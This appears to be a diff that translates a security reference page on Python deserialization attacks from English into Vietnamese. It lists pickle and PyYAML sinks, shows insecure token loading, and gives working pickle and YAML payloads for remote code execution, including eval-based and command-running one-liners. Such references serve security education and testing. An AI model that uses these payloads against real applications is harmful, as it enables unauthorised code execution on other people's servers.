@@ -1,22 +1,23 @@
 # Python Deserialization
 
-> Python deserialization is the process of reconstructing Python objects from serialized data, commonly done using formats like JSON, pickle, or YAML. The pickle module is a frequently used tool for this in Python, as it can serialize and deserialize complex Python objects, including custom classes.
+> Python deserialization là quá trình tái tạo các Python object từ dữ liệu đã được serialized, thường được thực hiện bằng các định dạng như JSON, pickle hoặc YAML. Module `pickle` là một công cụ thường được sử dụng cho mục đích này trong Python vì nó có thể serialize và deserialize các Python object phức tạp, bao gồm cả custom class.
 
-## Summary
+## Tóm tắt
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-    * [Pickle](#pickle)
-    * [PyYAML](#pyyaml)
-* [References](#references)
+* [Công cụ](#công-cụ)
+* [Phương pháp](#phương-pháp)
 
-## Tools
+  * [Pickle](#pickle)
+  * [PyYAML](#pyyaml)
+* [Tài liệu tham khảo](#tài-liệu-tham-khảo)
 
-* [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) - Serialized payload for deserialization RCE attack on python driven applications where pickle,PyYAML, ruamel.yaml or jsonpickle module is used for deserialization of serialized data.
+## Công cụ
 
-## Methodology
+* https://github.com/j0lt-github/python-deserialization-attack-payload-generator - Serialized payload cho tấn công RCE thông qua deserialization trên các ứng dụng sử dụng Python, nơi module `pickle`, `PyYAML`, `ruamel.yaml` hoặc `jsonpickle` được sử dụng để deserialize dữ liệu đã được serialized.
 
-In Python source code, look for these sinks:
+## Phương pháp
+
+Trong source code Python, tìm kiếm các sink sau:
 
 * `cPickle.loads`
 * `pickle.loads`
@@ -25,8 +26,9 @@ In Python source code, look for these sinks:
 
 ### Pickle
 
-The following code is a simple example of using `cPickle` in order to generate an auth_token which is a serialized User object.
-:warning: `import cPickle` will only work on Python 2
+Đoạn code sau là một ví dụ đơn giản về việc sử dụng `cPickle` để tạo một `auth_token`, là một serialized `User` object.
+
+:warning: `import cPickle` chỉ hoạt động trên Python 2.
 
 ```python
 import cPickle
@@ -43,7 +45,7 @@ auth_token = b64encode(cPickle.dumps(h))
 print("Your Auth Token : {}").format(auth_token)
 ```
 
-The vulnerability is introduced when a token is loaded from an user input.
+Lỗ hổng xuất hiện khi một token được load từ dữ liệu đầu vào do người dùng cung cấp.
 
 ```python
 new_token = raw_input("New Auth Token : ")
@@ -51,9 +53,9 @@ token = cPickle.loads(b64decode(new_token))
 print "Welcome {}".format(token.username)
 ```
 
-Python 2.7 documentation clearly states Pickle should never be used with untrusted sources. Let's create a malicious data that will execute arbitrary code on the server.
+Tài liệu Python 2.7 nêu rõ rằng Pickle không bao giờ nên được sử dụng với các nguồn không đáng tin cậy. Hãy tạo dữ liệu độc hại có khả năng thực thi arbitrary code trên server.
 
-> The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.
+> Module `pickle` không an toàn trước dữ liệu được tạo sai hoặc có mục đích độc hại. Không bao giờ unpickle dữ liệu nhận được từ một nguồn không đáng tin cậy hoặc chưa được xác thực.
 
 ```python
 import cPickle, os
@@ -68,7 +70,7 @@ evil_token = b64encode(cPickle.dumps(e))
 print("Your Evil Token : {}").format(evil_token)
 ```
 
-A universal payload can be created by loading `os` at runtime using eval:
+Một universal payload có thể được tạo bằng cách load `os` tại runtime thông qua `eval`:
 
 ```python
 import pickle
@@ -81,7 +83,7 @@ pickled = pickle.dumps(RCE())
 print(base64.b64encode(pickled).decode())
 ```
 
-This approach allows running arbitrary python code, which allows us to use different techniques from code injection:
+Cách tiếp cận này cho phép chạy arbitrary Python code, từ đó có thể sử dụng các kỹ thuật khác nhau từ code injection:
 
 ```python
 __import__('os').system('whoami') # Reflected RCE
@@ -92,7 +94,7 @@ __include__("os").popen("id && sleep 5").read() # Time-Based RCE
 
 ### PyYAML
 
-YAML deserialization is the process of converting YAML-formatted data back into objects in programming languages like Python, Ruby, or Java. YAML (YAML Ain't Markup Language) is popular for configuration files and data serialization because it is human-readable and supports complex data structures.
+YAML deserialization là quá trình chuyển đổi dữ liệu có định dạng YAML trở lại thành các object trong những ngôn ngữ lập trình như Python, Ruby hoặc Java. YAML (YAML Ain't Markup Language) phổ biến trong các file cấu hình và serialization dữ liệu vì nó dễ đọc đối với con người và hỗ trợ các cấu trúc dữ liệu phức tạp.
 
 ```yaml
 !!python/object/apply:time.sleep [10]
@@ -117,16 +119,16 @@ state: !!python/tuple
     update: !!python/name:exec
 ```
 
-Since PyYaml version 6.0, the default loader for `load` has been switched to SafeLoader mitigating the risks against Remote Code Execution. [PR #420 - Fix](https://github.com/yaml/pyyaml/issues/420)
+Kể từ PyYAML phiên bản 6.0, default loader của `load` đã được chuyển sang `SafeLoader`, giúp giảm thiểu rủi ro Remote Code Execution. [PR #420 - Fix](https://github.com/yaml/pyyaml/issues/420)
 
-The vulnerable sinks are now `yaml.unsafe_load` and `yaml.load(input, Loader=yaml.UnsafeLoader)`.
+Các sink dễ bị tổn thương hiện nay là `yaml.unsafe_load` và `yaml.load(input, Loader=yaml.UnsafeLoader)`.
 
 ```py
 with open('exploit_unsafeloader.yml') as file:
         data = yaml.load(file,Loader=yaml.UnsafeLoader)
 ```
 
-## References
+## Tài liệu tham khảo
 
 * [CVE-2019-20477 - 0Day YAML Deserialization Attack on PyYAML version <= 5.1.2 - Manmeet Singh (@_j0lt) - June 21, 2020](https://web.archive.org/web/20250501184227/https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/)
 * [Exploiting misuse of Python's "pickle" - Nelson Elhage - March 20, 2011](https://web.archive.org/web/20260211161939/https://blog.nelhage.com/2011/03/exploiting-pickle/)
